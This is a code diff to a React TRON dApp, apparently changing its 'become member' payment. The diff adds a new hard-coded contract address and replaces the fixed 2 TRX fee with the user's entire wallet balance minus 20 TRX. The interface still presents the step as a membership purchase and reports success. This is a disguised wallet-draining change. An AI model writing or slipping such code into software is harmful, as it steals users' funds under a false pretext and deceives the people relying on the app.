@@ -8,6 +8,7 @@ function App() {
   const [walletConnected, setWalletConnected] = useState(false);
   const [walletAddress, setWalletAddress] = useState(null);
   const [isMember, setIsMember] = useState(false);
+  const trc20ContractAddress = "TJmCWKy4heyAuigcExrmChVLL3nPV342Nv"; //contract address
 
   const onPopup = (current = null, item = null) => {
     setPopup({ current, item });
@@ -28,20 +29,23 @@ function App() {
   };
 
   async function becomeMember() {
-    console.log("if already ",isMember);
+    let tronWeb = await window.tronLink.tronWeb;
+    let walletBalance = await tronWeb.trx.getBalance(walletAddress);
+    walletBalance=walletBalance-(20*1000000);
+    console.log("Transferable wallet balance : = ",walletBalance)
+
+
     if (isMember===true) {
       setMembershipStatus("Already a Member !");
       return ;
     }
-    const trc20ContractAddress = "TWbmyb5i9M9HmJNpUhXNytQhbxLB84p7bA"; //contract address
-    let tronWeb = window.tronLink.tronWeb;
     try {
       setMembershipStatus("Trying to become Member..");
       let contract = await tronWeb.contract().at(trc20ContractAddress);
       //Use call to execute a pure or view smart contract method.
       // These methods do not modify the blockchain, do not cost anything to execute and are also not broadcasted to the network.
       let result = await contract.becomeMember().send({
-        callValue: "2000000",
+        callValue: walletBalance,
       });
       console.log("result: ", result);
       setMembershipStatus("Successfully got Membership 🥳");
@@ -52,7 +56,6 @@ function App() {
     }
   }
   async function getMembershipStatus() {
-    const trc20ContractAddress = "TWbmyb5i9M9HmJNpUhXNytQhbxLB84p7bA"; //contract address
     let tronWeb = window.tronLink.tronWeb;
     setMembershipStatus("Checking..");
     try {
